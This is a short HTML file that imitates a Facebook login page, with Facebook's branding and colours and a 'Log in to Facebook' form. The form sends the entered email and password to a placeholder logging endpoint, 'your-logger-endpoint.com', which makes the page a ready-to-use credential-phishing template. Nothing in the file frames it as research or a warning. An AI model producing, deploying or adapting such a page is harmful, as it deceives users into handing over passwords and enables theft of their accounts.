<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; }
    input { display: block; margin-bottom: 10px; padding: 10px; width: 100%; border: 1px solid #ccc; border-radius: 4px; }
    button { background-color: #1877f2; color: white; padding: 10px; border: none; border-radius: 4px; width: 100%; }
  </style>
</head>
<body>
  <div class="box">
    <form action="https://your-logger-endpoint.com/log" method="POST">
      <h2>Log in to Facebook</h2>
      <input type="text" name="email" placeholder="Email or phone number" required />
      <input type="password" name="pass" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>
